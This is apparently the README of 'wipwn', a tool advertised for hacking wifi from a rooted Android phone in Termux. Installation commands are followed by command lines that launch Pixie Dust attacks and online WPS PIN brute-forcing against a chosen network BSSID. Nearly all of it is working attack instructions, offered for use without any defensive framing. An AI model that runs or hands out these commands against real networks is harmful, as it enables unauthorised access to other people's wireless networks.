# wipwn
Hack wifi using termux (rooted)

### Installation :

```bash
pkg update && pkg upgrade -y
pkg install root-repo -y
pkg install git tsu python termux-api wpa-supplicant pixiewps iw -y
git clone https://github.com/ShTasrif/wipwn
cd wipwn
chmod +x wipwn.py
```
#### Help : `sudo python wipwn.py --help`
#### Example : `sudo python wipwn.py -i wlan0 -K`

#### Note: 
+ **First turn off your Wifi.**
+ **Turn on Hotspot.**
+ **Turn on Location.**
- Show avaliable networks and start Pixie Dust attack on a specified network.
- `sudo python wipwn.py -i wlan0 -K`
- - Start Pixie Dust attack on a specified BSSID:
`sudo python wipwn.py -i wlan0 -b 00:91:4C:C3:AC:28 -K`
- Launch online WPS bruteforce with the specified first half of the PIN:
- `sudo python wipwn.py -i wlan0 -b 00:90:4C:C1:AC:21 -B -p 1234`
### Troubleshooting
**"Device or resource busy (-16)" - Turn on Wifi and Then Turn off Wifi.**
